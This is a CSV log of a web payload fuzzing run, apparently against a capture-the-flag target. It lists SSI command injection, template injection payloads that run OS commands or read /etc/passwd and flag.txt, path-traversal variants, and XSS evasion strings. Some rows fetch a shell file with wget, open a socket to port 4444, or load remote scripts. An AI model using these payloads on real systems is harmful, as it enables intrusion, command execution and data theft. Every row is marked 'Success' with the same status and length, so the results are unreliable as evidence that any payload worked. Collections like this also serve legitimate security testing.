Status,Payload,HTTP Status,Content Length
Success,"<pre><!--#exec cmd=""whoami""--></pre>",200,10701
Success,"<pre><!--#exec cmd=""dir"" --></pre>",200,10701
Success,"<!--#exec cmd=""ls"" -->",200,10701
Success,"<!--#exec cmd=""wget http://website.com/dir/shell.txt"" -->",200,10701
Success,"<!--#exec cmd=""/bin/ls /"" -->",200,10701
Success,"<!--#exec cmd=""dir"" -->",200,10701
Success,"<!--#exec cmd=""cd C:\WINDOWS\System32"">",200,10701
Success,"<!--#config errmsg=""File not found, informs users and password""-->",200,10701
Success,"<!--#echo var=""DOCUMENT_NAME"" -->",200,10701
Success,"<!--#echo var=""DOCUMENT_URI"" -->",200,10701
Success,"<!--#fsize file=""ssi.shtml"" -->",200,10701
Success,<!--#include file=?UUUUUUUU...UU?-->,200,10701
Success,"<!--#echo var=""DATE_LOCAL"" --> ",200,10701
Success,"<!--#exec cmd=""whoami""--> ",200,10701
Success,<!--#printenv -->,200,10701
Success,"<!--#flastmod virtual=""echo.html"" -->",200,10701
Success,"<!--#echo var=""auth_type"" -->",200,10701
Success,"<!--#echo var=""http_referer"" -->",200,10701
Success,"<!--#echo var=""content_length"" -->",200,10701
Success,"<!--#echo var=""content_type"" -->",200,10701
Success,"<!--#echo var=""http_accept_encoding"" -->",200,10701
Success,"<!--#echo var=""forwarded"" -->",200,10701
Success,"<!--#echo var=""document_uri"" -->",200,10701
Success,"<!--#echo var=""date_gmt"" -->",200,10701
Success,"<!--#echo var=""date_local"" -->",200,10701
Success,"<!--#echo var=""document_name"" -->",200,10701
Success,"<!--#echo var=""document_root"" -->",200,10701
Success,"<!--#echo var=""from"" -->",200,10701
Success,"<!--#echo var=""gateway_interface"" -->",200,10701
Success,"<!--#echo var=""http_accept"" -->",200,10701
Success,"<!--#echo var=""http_accept_charset"" -->",200,10701
Success,"<!--#echo var=""http_accept_language"" -->",200,10701
Success,"<!--#echo var=""http_connection"" -->",200,10701
Success,"<!--#echo var=""http_cookie"" -->",200,10701
Success,"<!--#echo var=""http_form"" -->",200,10701
Success,"<!--#echo var=""http_host"" -->",200,10701
Success,"<!--#echo var=""user_name"" -->",200,10701
Success,"<!--#echo var=""unique_id"" -->",200,10701
Success,"<!--#echo var=""tz"" -->",200,10701
Success,"<!--#echo var=""total_hits"" -->",200,10701
Success,"<!--#echo var=""server_software"" -->",200,10701
Success,"<!--#echo var=""server_protocol"" -->",200,10701
Success,"<!--#echo var=""server_port"" -->",200,10701
Success,"<!--#echo var=""server_name -->",200,10701
Success,"<!--#echo var=""server_addr"" -->",200,10701
Success,"<!--#echo var=""server_admin"" -->",200,10701
Success,"<!--#echo var=""script_url"" -->",200,10701
Success,"<!--#echo var=""script_uri"" -->",200,10701
Success,"<!--#echo var=""script_name"" -->",200,10701
Success,"<!--#echo var=""script_filename"" -->",200,10701
Success,"<!--#echo var=""netsite_root"" -->",200,10701
Success,"<!--#echo var=""site_htmlroot"" -->",200,10701
Success,"<!--#echo var=""path_translated"" -->",200,10701
Success,"<!--#echo var=""path_info_translated"" -->",200,10701
Success,"<!--#echo var=""request_uri"" -->",200,10701
Success,"<!--#echo var=""request_method"" -->	",200,10701
Success,"<!--#echo var=""remote_user"" -->",200,10701
Success,"<!--#echo var=""remote_addr"" -->",200,10701
Success,"<!--#echo var=""http_client_ip"" -->",200,10701
Success,"<!--#echo var=""remote_port"" -->",200,10701
Success,"<!--#echo var=""remote_ident"" -->",200,10701
Success,"<!--#echo var=""remote_host"" -->",200,10701
Success,"<!--#echo var=""query_string_unescaped"" -->",200,10701
Success,"<!--#echo var=""query_string"" -->",200,10701
Success,"<!--#echo var=""path_translated"" -->",200,10701
Success,"<!--#echo var=""path_info"" -->",200,10701
Success,"<!--#echo var=""path"" -->",200,10701
Success,"<!--#echo var=""page_count"" -->",200,10701
Success,"<!--#echo var=""last_modified"" -->",200,10701
Success,"<!--#echo var=""http_user_agent"" -->",200,10701
Success,"<!--#echo var=""http_ua_os"" -->",200,10701
Success,"<!--#echo var=""http_ua_cpu"" -->",200,10701
Success,1{{4*4}}[[5*5]],200,10701
Success,{{7*7}},200,10701
Success,{{7*'7'}},200,10701
Success,<%= 7 * 7 %>,200,10701
Success,${3*3},200,10701
Success,${{7*7}},200,10701
Success,@(1+2),200,10701
Success,@(7*7),200,10701
Success,#{3*3},200,10701
Success,#{ 7 * 7 },200,10701
Success,{{dump(app)}},200,10701
Success,"{{app.request.server.all|join(',')}}",200,10701
Success,{{config.items()}},200,10701
Success,{{ [].class.base.subclasses() }},200,10701
Success,{{''.class.mro()[1].subclasses()}},200,10701
Success,{{ ''.__class__.__mro__[2].__subclasses__() }},200,10701
Success,"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",200,10701
Success,{{ request }},200,10701
Success,{{self}},200,10701
Success,<%= File.open('/etc/passwd').read %>,200,10701
Success,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",200,10701
Success,[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},200,10701
Success,"${""freemarker.template.utility.Execute""?new()(""id"")}",200,10701
Success,"{{app.request.query.filter(0,0,1024,{'options':'system'})}}",200,10701
Success,{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},200,10701
Success,"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read() }}",200,10701
Success,"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",200,10701
Success,{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},200,10701
Success,"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",200,10701
Success,{$smarty.version},200,10701
Success,{php}echo `id`;{/php},200,10701
Success,{{['id']|filter('system')}},200,10701
Success,{{['cat\x20/etc/passwd']|filter('system')}},200,10701
Success,{{['cat$IFS/etc/passwd']|filter('system')}},200,10701
Success,"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",200,10701
Success,"{{request|attr([""_""*2,""class"",""_""*2]|join)}}",200,10701
Success,"{{request|attr([""__"",""class"",""__""]|join)}}",200,10701
Success,"{{request|attr(""__class__"")}}",200,10701
Success,{{request.__class__}},200,10701
Success,{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},200,10701
Success,"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"", \""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{% endfor %}",200,10701
Success,"${self.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.template.module.cache.util.os.system(""id"")}",200,10701
Success,"${self.module.cache.compat.inspect.os.system(""id"")}",200,10701
Success,${self.__init__.__globals__['util'].os.system('id')},200,10701
Success,"${self.template.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.module.filters.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.runtime.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.runtime.exceptions.util.os.system(""id"")}",200,10701
Success,${self.template.__init__.__globals__['os'].system('id')},200,10701
Success,"${self.module.cache.util.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.runtime.util.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template._mmarker.module.cache.util.os.system(""id"")}",200,10701
Success,"${self.template.module.cache.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.template._mmarker.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",200,10701
Success,"${self.template.module.filters.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template.module.runtime.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.template.module.runtime.exceptions.util.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.context._with_template.module.cache.util.os.system(""id"")}",200,10701
Success,"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.context._with_template.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",200,10701
Success,"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",200,10701
Success,"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",200,10701
Success,"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",200,10701
Success,"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",200,10701
Success,"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",200,10701
Success,"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",200,10701
Success,"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",200,10701
Success,"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",200,10701
Success,"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",200,10701
Success,{{self._TemplateReference__context.cycler.__init__.__globals__.os}},200,10701
Success,{{self._TemplateReference__context.joiner.__init__.__globals__.os}},200,10701
Success,{{self._TemplateReference__context.namespace.__init__.__globals__.os}},200,10701
Success,{{cycler.__init__.__globals__.os}},200,10701
Success,{{joiner.__init__.__globals__.os}},200,10701
Success,{{namespace.__init__.__globals__.os}}../etc/passwd,200,10701
Success,../../etc/passwd,200,10701
Success,../../../etc/passwd,200,10701
Success,../../../../etc/passwd,200,10701
Success,../../../../../etc/passwd,200,10701
Success,../../../../../../etc/passwd,200,10701
Success,../../../../../../../etc/passwd,200,10701
Success,../../../../../../../../etc/passwd,200,10701
Success,..%2fetc%2fpasswd,200,10701
Success,..%2f..%2fetc%2fpasswd,200,10701
Success,..%2f..%2f..%2fetc%2fpasswd,200,10701
Success,..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
Success,..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
Success,..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
Success,..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
Success,..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,200,10701
Success,%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,200,10701
Success,%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,200,10701
Success,..%252fetc%252fpasswd,200,10701
Success,..%252f..%252fetc%252fpasswd,200,10701
Success,..%252f..%252f..%252fetc%252fpasswd,200,10701
Success,..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
Success,..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
Success,..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
Success,..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
Success,..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd,200,10701
Success,%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,200,10701
Success,%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,200,10701
Success,..\etc\passwd,200,10701
Success,..\..\etc\passwd,200,10701
Success,..\..\..\etc\passwd,200,10701
Success,..\..\..\..\etc\passwd,200,10701
Success,..\..\..\..\..\etc\passwd,200,10701
Success,..\..\..\..\..\..\etc\passwd,200,10701
Success,..\..\..\..\..\..\..\etc\passwd,200,10701
Success,..\..\..\..\..\..\..\..\etc\passwd,200,10701
Success,..%255cetc%255cpasswd,200,10701
Success,..%255c..%255cetc%255cpasswd,200,10701
Success,..%255c..%255c..%255cetc%255cpasswd,200,10701
Success,..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
Success,..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
Success,..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
Success,..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
Success,..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd,200,10701
Success,..%5c..%5cetc%5cpasswd,200,10701
Success,..%5c..%5c..%5cetc%5cpasswd,200,10701
Success,..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
Success,..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
Success,..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
Success,..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
Success,..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd,200,10701
Success,"'';!--""<XSS>=&{()}",200,10701
Success,"<IMG SRC=# onmouseover=""alert('xxs')"">",200,10701
Success,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,200,10701
Success,&#39;&#88;&#83;&#83;&#39;&#41;>,200,10701
Success,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,200,10701
Success,#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,200,10701
Success,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,10701
Success,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",200,10701
Success,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",200,10701
Success,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",200,10701
Success,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",200,10701
Success,"\"";alert('XSS');//",200,10701
Success,"<BR SIZE=""&{alert('XSS')}"">",200,10701
Success,"exp/*<A STYLE='no\xss:noxss(""*//*"");",200,10701
Success,"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",200,10701
Success,�script�alert(�XSS�)�/script�,200,10701
Success,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",200,10701
Success,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",200,10701
Success,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",200,10701
Success,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",200,10701
Success,"#""><img src=M onerror=alert('XSS');>",200,10701
Success,%22;alert%28%27RVRSH3LL_XSS%29//,200,10701
Success,"alert;pg(""XSS"")",200,10701
Success,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,10701
Success,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,10701
Success,\'-alert(1)//,200,10701
Success,<%78 onxxx=1 ,200,10701
Success,<x %6Fnxxx=1 ,200,10701
Success,<x o%6Exxx=1 ,200,10701
Success,<x on%78xx=1 ,200,10701
Success,<x onxxx%3D1,200,10701
Success,<X onxxx=1 ,200,10701
Success,<x OnXxx=1 ,200,10701
Success,<X OnXxx=1 ,200,10701
Success,<x onxxx=1 onxxx=1,200,10701
Success,<x/onxxx=1 ,200,10701
Success,<x%09onxxx=1 ,200,10701
Success,<x%0Aonxxx=1 ,200,10701
Success,<x%0Conxxx=1 ,200,10701
Success,<x%0Donxxx=1 ,200,10701
Success,<x%2Fonxxx=1 ,200,10701
Success,<x 1='1'onxxx=1 ,200,10701
Success,"<x 1=""1""onxxx=1",200,10701
Success,<x </onxxx=1 ,200,10701
Success,"<x 1="">"" onxxx=1 ",200,10701
Success,<http://onxxx%3D1/,200,10701
Success,<x onxxx=alert(1) 1=',200,10701
Success,*/alert(1)</script><script>/*,200,10701
Success,"<script src=""data:&comma;alert(1)//",200,10701
Success,"<script src=""//brutelogic.com.br&sol;1.js&num; ",200,10701
Success,"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",200,10701
Success,<br><br><br><br><br><br><br><br><br><br>,200,10701
Success,<br><br><br><br><br><br><br><br><br><br>,200,10701
Success,<br><br><br><br><br><br><x id=x>#x,200,10701
Success,alert&lpar;1&rpar;,200,10701
Success,alert&#x28;1&#x29,200,10701
Success,alert&#40;1&#41,200,10701
Success,"top[""al""+""ert""](1)",200,10701
Success,top[/al/.source+/ert/.source](1),200,10701
Success,navigator.vibrate(500),200,10701
Success,eval(URL.slice(-8))>#alert(1),200,10701
Success,eval(location.hash.slice(1)>#alert(1),200,10701
Success,innerHTML=location.hash>#<script>alert(1)</script>,200,10701
Success,%3exXx%3c,200,10701
Success,%253exXx%253c,200,10701
Success,%25%3exXx%25%3c,200,10701
Success,%5Cx3exXx%5Cx3c,200,10701
Success,%26gt%3bxXx%26lt%3b,200,10701
Success,%26%233e%3bxXx%26%233c%3b,200,10701
Success,%26%23x3e%3bxXx%26%23x3c%3b,200,10701
Success,PnhYeDw%3D,200,10701
Success,%5ce3e7858783c,200,10701
Success,%5cu003exXx%5cu003c,200,10701
Success,%5c076xXx%5c074,200,10701
Success,%C0%BExXx%C0%BC,200,10701
Success,%5cu563exXx%5cu563c,200,10701
Success,%C0%BExXx%C0%BC,200,10701
Success,%22%3exXx%3c%22,200,10701
Success,%2522%253exXx%253c%2522,200,10701
Success,%25%22%25%3exXx%25%3c%25%22,200,10701
Success,%5cx22%5cx3exXx%5cx3c%5cx22,200,10701
Success,%26quot%3b%26gt%3bxXx%26lt%3b%26quot%3b,200,10701
Success,%3b%26%2322%3b%26%233e%3bxXx%26%233c%3b%26%2322%3b,200,10701
Success,%3b%26%23x22%3b%26%23x3e%3bxXx%26%23x3c%3b%26%23x22%3b,200,10701
Success,Ij54WHg8Ig%3D%3D,200,10701
Success,%5ce223e7858783c22,200,10701
Success,%5cu0022xXx%5cu003exXx%5cu003c%5cu0022,200,10701
Success,%5c042%5c076xXx%5c074%5c042,200,10701
Success,%C0%A2%C0%BExXx%C0%BC%C0%A2,200,10701
Success,%5cu5622%5cu563exXx%5cu563c%5cu5622,200,10701
Success,%C0%A2%C0%BExXx%C0%BC%C0%A2,200,10701
Success,%27%22%3exXx%3c%27%22,200,10701
Success,%2527%2522%253exXx%253c%2527%2522,200,10701
Success,%25%27%25%22%25%3exXx%25%3c%25%27%25%22,200,10701
Success,%5cx27%5cx22%5cx3exXx%5cx3c%5cx27%5cx22,200,10701
Success,%26apos%3b%26quot%3b%26gt%3bxXx%26lt%3b%26apos%3b%26quot%3b,200,10701
Success,%26%2327%3b%26%2322%3b%26%233e%3bxXx%26%233c%3b%26%2327%3b%26%2322%3b,200,10701
Success,%26%23x27%3b%26%23x22%3b%26%23x3e%3bxXx%26%23x3c%3b%26%23x27%3b%26%23x22%3b,200,10701
Success,JyI%2beFh4PCci,200,10701
Success,%5ce27223e7858783c2722,200,10701
Success,%5cu0027%5cu0022%5cu003exXx%5cu003c%5cu0027%5cu0022,200,10701
Success,%5c047%5c042%5c076xXx%5c074%5c047%5c042,200,10701
Success,%C0%A7%C0%A2%C0%BExXx%C0%BC%C0%A7%C0%A2,200,10701
Success,%5cu5627%5cu5622%5cu563exXx%5cu563c%5cu5627%5cu5622,200,10701
Success,%C0%A7%C0%A2%C0%BExXx%C0%BC%C0%A7%C0%A2,200,10701
Success,xXx%27xXx,200,10701
Success,xXx%2527xXx,200,10701
Success,xXx%25%27xXx,200,10701
Success,xXx%5cx27xXx,200,10701
Success,xXx%26apos%3bxXx,200,10701
Success,xXx%26%2327%3bxXx,200,10701
Success,xXx%26%23x27%3bxXx,200,10701
Success,eFh4InhYeA%3D%3D,200,10701
Success,%5ce78587827785878,200,10701
Success,xXx%5cu0027xXx,200,10701
Success,xXx%5c047xXx,200,10701
Success,xXx%C0%A7xXx,200,10701
Success,xXx%5cu5627xXx,200,10701
Success,xXx%C0%A7xXx,200,10701
Success,xXx%5c%27xXx,200,10701
Success,xXx%255c%2527xXx,200,10701
Success,xXx%25%5c%25%27xXx,200,10701
Success,xXx%5cx5c%5cx27xXx,200,10701
Success,xXx%26%2392%3b%26apos%3bxXx,200,10701
Success,xXx%26%235c%3b%26%2327%3bxXx,200,10701
Success,xXx%26%23x5c%3b%26%23x27%3bxXx,200,10701
Success,eFh4XCd4WHg%3D,200,10701
Success,%5ce7858785c27785878,200,10701
Success,xXx%5cu005c%5cu0027xXx,200,10701
Success,xXx%5c134%5c047xXx,200,10701
Success,xXx%5c%C0%A7xXx,200,10701
Success,xXx%5cu565c%5cu5627xXx,200,10701
Success,xXx%5c%C0%A7xXx,200,10701
Success,xXx%5c%5c%5c%27xXx,200,10701
Success,xXx%255c%255c%255c%2527xXx,200,10701
Success,xXx%25%5c%25%5c%25%5c%25%27xXx,200,10701
Success,xXx%5cx5c%5cx5c%5cx5c%5cx27xXx,200,10701
Success,xXx%26%2392%3b%26%2392%3b%26%2392%3b%26apos%3bxXx,200,10701
Success,xXx%26%235c%3b%26%235c%3b%26%235c%3b%26%2327%3bxXx,200,10701
Success,xXx%26%23x5c%3b%26%23x5c%3b%26%23x5c%3b%26%23x27%3bxXx,200,10701
Success,eFh4XFxcJ3hYeA%3D%3D,200,10701
Success,%5ce7858785c5c5c27785878,200,10701
Success,xXx%5cu005c%5cu005c%5cu005c%5cu0027xXx,200,10701
Success,xXx%5c134%5c134%5c134%5c047xXx,200,10701
Success,xXx%5c%5c%5c%C0%A7xXx,200,10701
Success,xXx%5cu565c%5cu565c%5cu565c%5cu5627xXx,200,10701
Success,xXx%5c%5c%5c%C0%A7xXx,200,10701
Success,xXx%22xXx,200,10701
Success,xXx%2522xXx,200,10701
Success,xXx%25%22xXx,200,10701
Success,xXx%5cx22xXx,200,10701
Success,xXx%26quot%3bxXx,200,10701
Success,xXx%26%2322%3bxXx,200,10701
Success,xXx%26%23x22%3bxXx,200,10701
Success,eFh4InhYeA%3D%3D,200,10701
Success,%5ce78587822785878,200,10701
Success,xXx%5cu0022xXx,200,10701
Success,xXx%5c042xXx,200,10701
Success,xXx%C0%A2xXx,200,10701
Success,xXx%5cu5622xXx,200,10701
Success,xXx%C0%A2xXx,200,10701
Success,xXx%5c%22xXx,200,10701
Success,xXx%255c%2522xXx,200,10701
Success,xXx%25%5c%25%22xXx,200,10701
